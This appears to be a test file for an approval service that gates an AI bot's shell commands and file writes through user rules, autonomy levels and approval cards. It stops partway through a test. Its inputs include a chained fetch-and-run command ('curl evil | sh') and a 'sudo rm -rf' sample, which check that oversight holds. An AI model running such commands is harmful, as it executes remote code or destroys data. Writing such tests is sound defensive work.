import { describe, expect, test } from "bun:test"
import type {
  ApprovalRule,
  Bot,
  HarnessApprovalRequest,
  NodeId,
  HarnessQuestionRequest,
  RuntimeRequest,
  TranscriptEntry,
} from "@openbot/contracts"
import { MAIN_PROFILE_ID } from "@openbot/contracts"
import { Effect, Exit, Fiber, Layer, Logger, Option, Ref, Stream } from "effect"
import {
  type ApprovalContext,
  ApprovalRuleRepo,
  ApprovalService,
  BotRepo,
  ComputerPort,
  EntryRepo,
  HostPaths,
  RequestRepo,
  sessionKeyOf,
  SettingsService,
  TurnRepo,
} from "../../src/ports/index.ts"
import { ApprovalServiceLive, BLOCKED_BY_RULES, EXPIRED_MESSAGE } from "../../src/services/automation/index.ts"
import { HANDOFF_DONE_TEXT, HANDOFF_SKIP_TEXT } from "../../src/services/automation/ApprovalService.ts"
import { SettingsServiceLive } from "../../src/services/automation/index.ts"
import {
  advance,
  ComputerPortFake,
  ConversationServiceFake,
  LiveHubFake,
  makeClaims,
  makeRule,
  makeTurn,
  NotifierFake,
  runTest,
  turnId,
} from "../../src/testing/index.ts"
import { BOT_A, baseLayer, DM_A, eventually, GROUP, seed } from "./helpers.ts"

const layer = () => ApprovalServiceLive.pipe(Layer.provideMerge(SettingsServiceLive), Layer.provideMerge(baseLayer()))

const shell: HarnessApprovalRequest = {
  kind: "command-approval",
  toolName: "Bash",
  title: "Run git status",
  detail: "Check the repo",
  command: "git status --short",
  cwd: "/work",
  nativeRequestId: "native-1",
}

const question: HarnessQuestionRequest = {
  kind: "question",
  title: "Pick a color",
  questions: [
    {
      id: "color",
      prompt: "Which color?",
      options: [{ label: "Red" }, { label: "Blue" }],
      multiSelect: false,
      allowFreeText: false,
    },
    { id: "tags", prompt: "Tags?", options: [{ label: "a" }, { label: "b" }], multiSelect: true, allowFreeText: true },
  ],
}

const ctx = (overrides?: Partial<ApprovalContext>): ApprovalContext => ({
  bot: BOT_A,
  conversationId: DM_A.id,
  turnId: turnId("trn_1"),
  harness: "fake",
  ...overrides,
})

const pendingRequests = Effect.flatMap(ApprovalService, (s) => s.listPending({}))
const hasPending = (n: number) => Effect.map(pendingRequests, (all) => all.length === n)
const firstPending = Effect.map(pendingRequests, (all) => all[0]!)
const entry = (id: RuntimeRequest["cardEntryId"]) =>
  Effect.flatMap(EntryRepo, (repo) => repo.get(id)).pipe(Effect.map(Option.getOrThrow))
const cardState = (e: TranscriptEntry) => (e.kind === "card" ? e.state : undefined)
const putRule = (rule: Partial<ApprovalRule>) =>
  Effect.flatMap(ApprovalRuleRepo, (repo) =>
    repo.upsert(makeRule({ id: `rul_${rule.action}` as ApprovalRule["id"], ...rule })),
  )

describe("ApprovalService.evaluate", () => {
  test("allow rule → allow-once with an auto-decided event; deny rule → deny 'Blocked by your rules'", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        yield* putRule({ action: "allow", surface: "shell", match: { commandPrefix: "git status" } })
        const allowed = yield* approvals.evaluate(ctx(), shell)
        yield* putRule({ action: "deny", surface: "shell", botId: BOT_A.id, match: {} })
        const denied = yield* approvals.evaluate(ctx(), shell)
        const written = yield* (yield* ConversationServiceFake).written
        return { allowed, denied, written, pending: yield* pendingRequests }
      }),
      layer(),
    )
    expect(out.allowed).toEqual({ decision: "allow-once" })
    expect(out.denied).toEqual({ decision: "deny", message: BLOCKED_BY_RULES })
    expect(out.pending).toHaveLength(0)
    const events = out.written.flatMap((e) => (e.kind === "event" && e.event.type === "auto-decided" ? [e.event] : []))
    expect(events.map((e) => e.decision)).toEqual(["allowed", "denied"])
    expect(events[0]).toMatchObject({ summary: "Run git status", toolName: "Bash", ruleId: "rul_allow" })
  })

  test("Always allow is offered only when the rule names a program (never a whole-tool shell rule)", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const ask = (command: string, n: number) =>
          Effect.gen(function* () {
            const fiber = yield* approvals
              .evaluate(ctx(), { ...shell, command, nativeRequestId: `native-${n}` })
              .pipe(Effect.forkChild({ startImmediately: true }))
            yield* eventually(hasPending(1))
            const request = yield* firstPending
            yield* approvals.respond({ requestId: request.id, response: { type: "decision", decision: "deny" } })
            yield* Fiber.join(fiber)
            return request
          })
        return {
          assigned: yield* ask("f=scenes/cache-demo/src/main.rs; wc -l $f", 1),
          unnamed: yield* ask("$EDITOR notes.md", 2),
        }
      }),
      layer(),
    )
    expect(out.assigned.suggestedRule).toEqual({ surface: "shell", match: { toolName: "Bash", commandPrefix: "wc" } })
    expect(out.assigned.responseCapability).toMatchObject({
      options: [{ id: "allow-once" }, { id: "allow-always" }, { id: "deny" }],
    })
    expect(out.unnamed.suggestedRule).toEqual({ surface: "shell", match: { toolName: "Bash" } })
    expect(out.unnamed.responseCapability).toMatchObject({ options: [{ id: "allow-once" }, { id: "deny" }] })
  })

  test("ask → pending request + card + notification + onPending; respond allow-once resolves the waiter", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const onPending = yield* Ref.make<ReadonlyArray<string>>([])
        const fiber = yield* approvals
          .evaluate(ctx({ onPending: (r) => Ref.update(onPending, (all) => [...all, r.id]) }), shell)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        const pendingCard = yield* entry(request.cardEntryId)
        const responded = yield* approvals.respond({
          requestId: request.id,
          response: { type: "decision", decision: "allow-once", message: "go ahead" },
        })
        const resolution = yield* Fiber.join(fiber)
        return {
          request,
          pendingCard,
          responded,
          resolution,
          onPending: yield* Ref.get(onPending),
          card: yield* entry(request.cardEntryId),
          sent: yield* (yield* NotifierFake).sent,
          again: yield* Effect.exit(
            approvals.respond({ requestId: request.id, response: { type: "decision", decision: "deny" } }),
          ),
        }
      }),
      layer(),
    )
    expect(out.request).toMatchObject({
      conversationId: DM_A.id,
      botId: BOT_A.id,
      kind: "command-approval",
      status: "pending",
      blocking: true,
      expiresAt: 10 * 60_000,
      turnId: "trn_1",
      subject: { toolName: "Bash", command: "git status --short", cwd: "/work" },
      suggestedRule: { surface: "shell", match: { toolName: "Bash", commandPrefix: "git status" } },
      source: { origin: "fake", method: "command-approval", nativeRequestId: "native-1" },
    })
    expect(out.request.responseCapability).toMatchObject({
      type: "decision",
      options: [{ id: "allow-once" }, { id: "allow-always" }, { id: "deny" }],
    })
    expect(out.pendingCard).toMatchObject({
      kind: "card",
      turnId: "trn_1",
      card: { type: "approval", requestId: out.request.id, title: "Run git status", command: "git status --short" },
      state: { status: "pending" },
    })
    expect(out.onPending).toEqual([out.request.id])
    expect(out.resolution).toEqual({ decision: "allow-once", message: "go ahead" })
    expect(out.responded).toMatchObject({
      status: "resolved",
      resolvedBy: { kind: "user" },
      response: { decision: "allow-once" },
    })
    expect(cardState(out.card)).toMatchObject({
      status: "resolved",
      response: { type: "decision", decision: "allow-once" },
    })
    expect(out.sent).toHaveLength(1)
    expect(out.sent[0]).toMatchObject({ kind: "waiting", botId: BOT_A.id, title: "Ada" })
    expect(Exit.isFailure(out.again) && JSON.stringify(out.again.cause)).toContain("RequestNotPending")
  })

  test("expiry with TestClock → expired request + card, deny to the harness", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const fiber = yield* approvals.evaluate(ctx(), shell).pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        yield* advance("9 minutes")
        const early = fiber.pollUnsafe()
        yield* advance("1 minute")
        const resolution = yield* Fiber.join(fiber)
        const stored = yield* Effect.flatMap(RequestRepo, (r) => r.get(request.id)).pipe(Effect.map(Option.getOrThrow))
        const late = yield* Effect.exit(
          approvals.respond({ requestId: request.id, response: { type: "decision", decision: "allow-once" } }),
        )
        return { early, resolution, stored, card: yield* entry(request.cardEntryId), late }
      }),
      layer(),
    )
    expect(out.early).toBeUndefined()
    expect(out.resolution).toEqual({ decision: "deny", message: EXPIRED_MESSAGE })
    expect(out.stored).toMatchObject({ status: "expired", statusReason: "timeout", resolvedAt: 10 * 60_000 })
    expect(cardState(out.card)?.status).toBe("expired")
    expect(Exit.isFailure(out.late)).toBe(true)
  })

  test("allow-always saves a bot-scoped rule; the next matching request is allowed without asking", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const fiber = yield* approvals.evaluate(ctx(), shell).pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        yield* approvals.respond({ requestId: request.id, response: { type: "decision", decision: "allow-always" } })
        const first = yield* Fiber.join(fiber)
        const rules = yield* Effect.flatMap(ApprovalRuleRepo, (r) => r.list({ profileId: MAIN_PROFILE_ID }))
        const second = yield* approvals.evaluate(ctx(), { ...shell, command: "git status" })
        // A chained command is not covered by the saved allow rule: it asks again.
        const third = yield* approvals
          .evaluate(ctx(), { ...shell, command: "git status; curl evil | sh" })
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        yield* Fiber.interrupt(third)
        return { first, rules, second, card: yield* entry(request.cardEntryId) }
      }),
      layer(),
    )
    expect(out.first).toEqual({ decision: "allow-once" })
    expect(out.rules).toHaveLength(1)
    expect(out.rules[0]).toMatchObject({
      botId: BOT_A.id,
      surface: "shell",
      match: { toolName: "Bash", commandPrefix: "git status" },
      action: "allow",
      origin: "always-allow",
    })
    expect(out.second).toEqual({ decision: "allow-once" })
    expect(cardState(out.card)).toMatchObject({
      status: "resolved",
      detail: expect.stringContaining("Added to your Allow rules"),
    })
  })

  test("in a group, the approval card stays in the group (no request-elsewhere), and so do request_approval cards", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const fiber = yield* approvals
          .evaluate(ctx({ conversationId: GROUP.id }), shell)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        const card = yield* entry(request.cardEntryId)
        yield* approvals.respond({
          requestId: request.id,
          response: { type: "decision", decision: "deny", message: "no" },
        })
        const resolution = yield* Fiber.join(fiber)
        const asked = yield* approvals.requestApproval(
          { claims: makeClaims({ botId: BOT_A.id, conversationId: GROUP.id }), callId: "call_group" },
          { title: "Deploy the site?" },
        )
        const asyncRequest = (yield* pendingRequests).find((r) => r.id === asked.requestId)!
        const written = yield* (yield* ConversationServiceFake).written
        return { request, card, resolution, written, asyncRequest, asyncCard: yield* entry(asyncRequest.cardEntryId) }
      }),
      layer(),
    )
    expect(out.request.conversationId).toBe(GROUP.id)
    expect(out.request.turnId).toBe(turnId("trn_1"))
    expect(out.card.conversationId).toBe(GROUP.id)
    expect(out.card.turnId).toBe(turnId("trn_1"))
    expect(out.written.some((e) => e.kind === "event" && e.event.type === "request-elsewhere")).toBe(false)
    expect(out.resolution).toEqual({ decision: "deny", message: "no" })
    expect(out.asyncRequest.conversationId).toBe(GROUP.id)
    expect(out.asyncCard.conversationId).toBe(GROUP.id)
  })

  test("questions: answers are validated and mapped (single → string, multi → array)", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const fiber = yield* approvals
          .evaluate(ctx({ conversationId: GROUP.id }), question)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        const wrongType = yield* Effect.exit(
          approvals.respond({ requestId: request.id, response: { type: "decision", decision: "allow-once" } }),
        )
        const notAnOption = yield* Effect.exit(
          approvals.respond({
            requestId: request.id,
            response: { type: "answers", answers: { color: ["Green"], tags: ["a"] } },
          }),
        )
        const missing = yield* Effect.exit(
          approvals.respond({ requestId: request.id, response: { type: "answers", answers: { color: ["Red"] } } }),
        )
        yield* approvals.respond({
          requestId: request.id,
          response: { type: "answers", answers: { color: ["Blue"], tags: ["a", "custom"] } },
        })
        return { request, wrongType, notAnOption, missing, resolution: yield* Fiber.join(fiber) }
      }),
      layer(),
    )
    // Questions stay in the group (only approvals and secrets move to the DM).
    expect(out.request).toMatchObject({ kind: "question", conversationId: GROUP.id, title: "Pick a color" })
    for (const exit of [out.wrongType, out.notAnOption, out.missing]) {
      expect(Exit.isFailure(exit) && JSON.stringify(exit.cause)).toContain("InvalidInput")
    }
    expect(out.resolution).toEqual({ answers: { color: "Blue", tags: ["a", "custom"] } })
  })

  test("interrupting the waiting fiber cancels the request and its card", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const fiber = yield* approvals.evaluate(ctx(), shell).pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        yield* Fiber.interrupt(fiber)
        const stored = yield* Effect.flatMap(RequestRepo, (r) => r.get(request.id)).pipe(Effect.map(Option.getOrThrow))
        return { stored, card: yield* entry(request.cardEntryId) }
      }),
      layer(),
    )
    expect(out.stored).toMatchObject({ status: "cancelled", statusReason: "turn-ended" })
    expect(cardState(out.card)?.status).toBe("cancelled")
  })

  test("cancelPending releases the waiter with cancel and counts the requests", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const fiber = yield* approvals.evaluate(ctx(), shell).pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const none = yield* approvals.cancelPending({ turnId: turnId("trn_other"), reason: "turn-ended" })
        const count = yield* approvals.cancelPending({ turnId: turnId("trn_1"), reason: "turn-ended" })
        return { none, count, resolution: yield* Fiber.join(fiber), pending: yield* pendingRequests }
      }),
      layer(),
    )
    expect(out.none).toBe(0)
    expect(out.count).toBe(1)
    expect(out.resolution).toEqual({ decision: "cancel" })
    expect(out.pending).toHaveLength(0)
  })
})

describe("ApprovalService.cancelPending filters", () => {
  test("kinds + asyncOnly close only the open ask_user question, with its reason and card detail", async () => {
    const claims = makeClaims({ botId: BOT_A.id, conversationId: DM_A.id })
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const asked = yield* approvals.askUser({ claims, callId: "call-q" }, { questions: question.questions })
        const blocking = yield* approvals.evaluate(ctx(), question).pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(2))
        const count = yield* approvals.cancelPending({
          conversationId: DM_A.id,
          kinds: ["question"],
          asyncOnly: true,
          reason: "answered-in-chat",
          cardDetail: "Answered in chat",
        })
        const closed = Option.getOrThrow(yield* Effect.flatMap(RequestRepo, (repo) => repo.get(asked.requestId)))
        const pending = yield* pendingRequests
        yield* approvals.cancelPending({ turnId: turnId("trn_1"), reason: "turn-ended" })
        yield* Fiber.join(blocking)
        return { count, closed, card: cardState(yield* entry(closed.cardEntryId)), pending }
      }),
      layer(),
    )
    expect(out.count).toBe(1)
    expect(out.closed).toMatchObject({ status: "cancelled", statusReason: "answered-in-chat" })
    expect(out.card).toMatchObject({ status: "cancelled", detail: "Answered in chat" })
    expect(out.pending.map((r) => r.blocking)).toEqual([true])
  })
})

describe("ApprovalService.evaluate with the bot's autonomy", () => {
  const W = "/data/bots/bot_a/workspace"
  const workspace = { nodeId: "node_local" as NodeId, path: W }
  const inside: HarnessApprovalRequest = {
    kind: "file-approval",
    toolName: "Write",
    title: "Write hello.ts",
    detail: "",
    paths: [`${W}/hello.ts`],
  }
  const bunTest: HarnessApprovalRequest = {
    ...shell,
    title: "Run bun tests",
    command: "bun test",
    cwd: `${W}/wordfreq`,
  }
  const outside: HarnessApprovalRequest = { ...inside, title: "Write .bashrc", paths: ["/home/me/.bashrc"] }
  const autoCtx = (autonomy: Bot["autonomy"], extra?: Partial<ApprovalContext>) =>
    ctx({ bot: { ...BOT_A, autonomy }, workspace, ...extra })
  const autoEvents = (written: ReadonlyArray<TranscriptEntry>) =>
    written.flatMap((e) => (e.kind === "event" && e.event.type === "auto-decided" ? [e.event] : []))
  const cards = (written: ReadonlyArray<TranscriptEntry>) => written.filter((e) => e.kind === "card")

  test("workspace: inside → allowed without a card, recorded as an auto-decided event", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const write = yield* approvals.evaluate(autoCtx("workspace"), inside)
        const tests = yield* approvals.evaluate(autoCtx("workspace"), bunTest)
        return {
          write,
          tests,
          written: yield* (yield* ConversationServiceFake).written,
          pending: yield* pendingRequests,
        }
      }),
      layer(),
    )
    expect(out.write).toEqual({ decision: "allow-once" })
    expect(out.tests).toEqual({ decision: "allow-once" })
    expect(out.pending).toHaveLength(0)
    expect(cards(out.written)).toHaveLength(0)
    expect(autoEvents(out.written)).toEqual([
      {
        type: "auto-decided",
        decision: "allowed",
        summary: "Write hello.ts",
        toolName: "Write",
        autonomy: "workspace",
      },
      { type: "auto-decided", decision: "allowed", summary: "Run bun tests", toolName: "Bash", autonomy: "workspace" },
    ])
  })

  test("workspace: outside → card, and Always allow suggests the whole workspace for inside files", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const fiber = yield* approvals
          .evaluate(autoCtx("workspace"), outside)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const outsideRequest = yield* firstPending
        yield* approvals.respond({ requestId: outsideRequest.id, response: { type: "decision", decision: "deny" } })
        const denied = yield* Fiber.join(fiber)
        // "ask" autonomy: the inside write gets a card; its suggestion covers the workspace
        const asking = yield* approvals
          .evaluate(autoCtx("ask"), inside)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const insideRequest = yield* firstPending
        yield* Fiber.interrupt(asking)
        return { denied, outsideRequest, insideRequest }
      }),
      layer(),
    )
    expect(out.denied).toMatchObject({ decision: "deny" })
    expect(out.outsideRequest.suggestedRule).toEqual({
      surface: "file-edit",
      match: { toolName: "Write", pathPrefix: "/home/me" },
    })
    expect(out.insideRequest.suggestedRule).toEqual({
      surface: "file-edit",
      match: { toolName: "Write", pathPrefix: W },
    })
  })

  test("full: anything is allowed; a deny rule still blocks and an Ask first rule still asks", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const anything = yield* approvals.evaluate(autoCtx("full", { workspace: undefined }), {
          ...shell,
          command: "sudo rm -rf /tmp/x",
          cwd: "/",
        })
        yield* putRule({ action: "deny", surface: "file-edit", match: { pathPrefix: "/home/me" } })
        const blocked = yield* approvals.evaluate(autoCtx("full"), outside)
        yield* putRule({ action: "ask", surface: "shell", botId: BOT_A.id, match: { commandPrefix: "bun" } })
        const fiber = yield* approvals
          .evaluate(autoCtx("full"), bunTest)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const asked = yield* firstPending
        yield* Fiber.interrupt(fiber)
        return { anything, blocked, asked, written: yield* (yield* ConversationServiceFake).written }
      }),
      layer(),
    )
    expect(out.anything).toEqual({ decision: "allow-once" })
    expect(out.blocked).toEqual({ decision: "deny", message: BLOCKED_BY_RULES })
    expect(out.asked).toMatchObject({ title: "Run bun tests" })
    expect(
      autoEvents(out.written).map((e) => [e.decision, e.autonomy ?? e.ruleId] as ReadonlyArray<string | undefined>),
    ).toEqual([
      ["allowed", "full"],
      ["denied", "rul_deny"],
    ])
  })

  test("ask autonomy and an unknown workspace keep asking; node ceilings are never overridden", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const bots = yield* BotRepo
        yield* bots.upsert({ ...BOT_A, autonomy: "full" })
        const fiber1 = yield* approvals
          .evaluate(autoCtx("ask"), inside)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const fiber2 = yield* approvals
          .evaluate(autoCtx("workspace", { workspace: undefined }), inside)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(2))
        const fiber3 = yield* approvals
          .evaluateNode({
            nodeId: "nod_1" as never,
            request: {
              invocationId: "inv_9",
              botId: BOT_A.id,
              reason: "node ceiling",
              action: "run-command",
              target: "make deploy",
            },
          })
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(3))
        for (const f of [fiber1, fiber2]) yield* Fiber.interrupt(f)
        yield* Fiber.interrupt(fiber3)
        return true
      }),
      layer(),
    )
    expect(out).toBe(true)
  })

  test("a rule-less allow-always on a chained workspace command saves the program, and covers later chains", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const chained: HarnessApprovalRequest = {
          ...shell,
          command: `cd ${W}/wordfreq && bun test 2>&1 | tail -20`,
          cwd: "/home/me",
        }
        const fiber = yield* approvals
          .evaluate(autoCtx("ask"), chained)
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        yield* approvals.respond({ requestId: request.id, response: { type: "decision", decision: "allow-always" } })
        yield* Fiber.join(fiber)
        const later = yield* approvals.evaluate(autoCtx("ask"), {
          ...chained,
          command: "cd /elsewhere && bun test --watch | head",
        })
        return { rules: yield* Effect.flatMap(ApprovalRuleRepo, (r) => r.list({ profileId: MAIN_PROFILE_ID })), later }
      }),
      layer(),
    )
    expect(out.rules[0]).toMatchObject({
      botId: BOT_A.id,
      surface: "shell",
      match: { toolName: "Bash", commandPrefix: "bun test" },
    })
    expect(out.later).toEqual({ decision: "allow-once" })
  })
})

describe('ApprovalService: project folders and "Allow in ‹folder›"', () => {
  const W = "/data/bots/bot_a/workspace"
  const workspace = { nodeId: "node_local" as NodeId, path: W }
  const SNIP = "/home/me/projects/snip"
  const inSnip: HarnessApprovalRequest = {
    ...shell,
    title: "Run bun test",
    command: "bun test",
    cwd: `${SNIP}/src`,
    toolKey: "toolu_9",
  }
  /** The local computer: home `/home/me`, `SNIP` is a git repo. */
  const hostPaths = Layer.succeed(
    HostPaths,
    HostPaths.of({
      home: (nodeId) => (nodeId === "node_local" ? "/home/me" : undefined),
      projectRoot: (_nodeId, dir) => Effect.succeed(dir === SNIP || dir.startsWith(`${SNIP}/`) ? SNIP : undefined),
    }),
  )
  const withHost = () => layer().pipe(Layer.provideMerge(hostPaths))
  const wsCtx = (bot: Bot = { ...BOT_A, autonomy: "workspace" }) => ctx({ bot, workspace })
  const autoEvents = (written: ReadonlyArray<TranscriptEntry>) =>
    written.flatMap((e) => (e.kind === "event" && e.event.type === "auto-decided" ? [e] : []))

  test("shared folders (Settings) and the bot's own folders count as workspace; events keep turn + tool key", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const settings = yield* SettingsService
        yield* settings.update({ sharedProjectFolders: ["~/projects"] })
        const shared = yield* approvals.evaluate(wsCtx(), inSnip)
        yield* settings.update({ sharedProjectFolders: [] })
        const own = yield* approvals.evaluate(
          wsCtx({ ...BOT_A, autonomy: "workspace", projectFolders: [SNIP] }),
          inSnip,
        )
        return {
          shared,
          own,
          written: yield* (yield* ConversationServiceFake).written,
          pending: yield* pendingRequests,
        }
      }),
      withHost(),
    )
    expect(out.shared).toEqual({ decision: "allow-once" })
    expect(out.own).toEqual({ decision: "allow-once" })
    expect(out.pending).toHaveLength(0)
    const events = autoEvents(out.written)
    expect(events).toHaveLength(2)
    for (const e of events) {
      expect(e.turnId).toBe(turnId("trn_1"))
      expect(e.kind === "event" && e.event).toMatchObject({
        type: "auto-decided",
        autonomy: "workspace",
        toolKey: "toolu_9",
      })
    }
  })

  test('outside every folder: the card offers the git repo root; "Allow in" adds it and allows, later work there is automatic', async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const botsRepo = yield* BotRepo
        yield* botsRepo.upsert({ ...BOT_A, autonomy: "workspace" })
        const fiber = yield* approvals.evaluate(wsCtx(), inSnip).pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        const card = yield* entry(request.cardEntryId)
        const responded = yield* approvals.respond({
          requestId: request.id,
          response: { type: "decision", decision: "allow-once", scope: "project-folder" },
        })
        const resolution = yield* Fiber.join(fiber)
        const bot = Option.getOrThrow(yield* botsRepo.get(BOT_A.id))
        const later = yield* approvals.evaluate(wsCtx(bot), { ...inSnip, command: "bun run build", cwd: SNIP })
        return {
          request,
          card,
          responded,
          resolution,
          bot,
          later,
          after: yield* entry(request.cardEntryId),
          roster: yield* (yield* LiveHubFake).rosterChanges,
        }
      }),
      withHost(),
    )
    expect(out.request.projectFolder).toBe(SNIP)
    expect(out.card.kind === "card" && out.card.card).toMatchObject({ type: "approval", projectFolder: SNIP })
    expect(out.responded.response).toEqual({ type: "decision", decision: "allow-once", scope: "project-folder" })
    expect(out.resolution).toEqual({ decision: "allow-once" })
    expect(out.bot.projectFolders).toEqual([SNIP])
    expect(out.roster.some((c) => c.type === "bot.upserted" && c.bot.projectFolders.includes(SNIP))).toBe(true)
    expect(cardState(out.after)).toMatchObject({ status: "resolved", detail: `Added ${SNIP} to Ada's project folders` })
    expect(out.later).toEqual({ decision: "allow-once" })
  })

  test("no git repo → the directory is offered; home, system dirs, ask/full autonomy and node ceilings get no offer", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const offerFor = (request: HarnessApprovalRequest, c: ApprovalContext = wsCtx()) =>
          Effect.gen(function* () {
            const fiber = yield* approvals.evaluate(c, request).pipe(Effect.forkChild({ startImmediately: true }))
            yield* eventually(hasPending(1))
            const pending = yield* firstPending
            yield* Fiber.interrupt(fiber)
            yield* eventually(hasPending(0))
            return pending.projectFolder ?? null
          })
        return {
          plainDir: yield* offerFor({ ...inSnip, cwd: "/srv/tools/app" }),
          home: yield* offerFor({ ...inSnip, cwd: "/home/me" }),
          system: yield* offerFor({ ...inSnip, cwd: "/etc" }),
          fileDir: yield* offerFor({
            kind: "file-approval",
            toolName: "Write",
            title: "Write",
            detail: "",
            paths: ["/srv/tools/app/a.ts"],
          }),
          askAutonomy: yield* offerFor(inSnip, ctx({ bot: { ...BOT_A, autonomy: "ask" }, workspace })),
          riskyInside: yield* offerFor({ ...inSnip, command: "git push", cwd: W }),
        }
      }),
      withHost(),
    )
    expect(out).toEqual({
      plainDir: "/srv/tools/app",
      home: null,
      system: null,
      fileDir: "/srv/tools/app",
      askAutonomy: null,
      riskyInside: null,
    })
  })

  test('scope "project-folder" without an offer is refused; without HostPaths the cwd is offered and `~` is not expanded', async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const settings = yield* SettingsService
        yield* settings.update({ sharedProjectFolders: ["~/projects"] })
        const fiber = yield* approvals.evaluate(wsCtx(), inSnip).pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        const plain = yield* approvals
          .evaluate(ctx({ bot: { ...BOT_A, autonomy: "workspace" }, workspace }), { ...inSnip, cwd: "/etc" })
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(2))
        const noOffer = (yield* pendingRequests).find((r) => r.id !== request.id)!
        const refused = yield* approvals
          .respond({
            requestId: noOffer.id,
            response: { type: "decision", decision: "allow-once", scope: "project-folder" },
          })
          .pipe(Effect.flip)
        const wrongDecision = yield* approvals
          .respond({
            requestId: request.id,
            response: { type: "decision", decision: "allow-always", scope: "project-folder" },
          })
          .pipe(Effect.flip)
        yield* Fiber.interrupt(fiber)
        yield* Fiber.interrupt(plain)
        return { request, refused, wrongDecision }
      }),
      layer(),
    )
    expect(out.request.projectFolder).toBe(`${SNIP}/src`)
    expect(out.refused._tag).toBe("InvalidInput")
    expect(out.wrongDecision._tag).toBe("InvalidInput")
  })

  test("an auto-decision without a turn in its context (node ceiling) lands on the bot's running turn", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        yield* (yield* TurnRepo).upsert(
          makeTurn({ id: turnId("trn_live"), botId: BOT_A.id, conversationId: DM_A.id, status: "running" }),
        )
        yield* putRule({ action: "allow", surface: "shell", match: { commandPrefix: "make" } })
        const decided = yield* approvals.evaluateNode({
          nodeId: "nod_1" as never,
          request: {
            invocationId: "inv_1",
            botId: BOT_A.id,
            reason: "node ceiling",
            action: "run-command",
            target: "make test",
          },
        })
        return { decided, written: yield* (yield* ConversationServiceFake).written }
      }),
      layer(),
    )
    expect(out.decided).toEqual({ decision: "allow-once", by: "rule" })
    expect(autoEvents(out.written).map((e) => e.turnId)).toEqual([turnId("trn_live")])
  })

  test("settings.update normalizes shared folders and refuses invalid ones", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        const settings = yield* SettingsService
        const saved = yield* settings.update({ sharedProjectFolders: [" ~/projects/ ", "~/projects", "/srv/code//"] })
        const refused = yield* settings.update({ sharedProjectFolders: ["/"] }).pipe(Effect.flip)
        return {
          saved: saved.sharedProjectFolders,
          refused: refused._tag,
          now: (yield* settings.get).sharedProjectFolders,
        }
      }),
      layer(),
    )
    expect(out).toEqual({
      saved: ["~/projects", "/srv/code"],
      refused: "InvalidInput",
      now: ["~/projects", "/srv/code"],
    })
  })
})

describe("ApprovalService async tools (D3.3)", () => {
  test("askUser returns pending immediately, is idempotent on the call id, and the answer becomes a delivery", async () => {
    const claims = makeClaims({ botId: BOT_A.id, conversationId: GROUP.id })
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const answers = yield* Stream.runCollect(Stream.take(approvals.asyncAnswers, 1)).pipe(
          Effect.forkChild({ startImmediately: true }),
        )
        const receipt = yield* approvals.askUser({ claims, callId: "call-1" }, { questions: question.questions })
        const again = yield* approvals.askUser({ claims, callId: "call-1" }, { questions: question.questions })
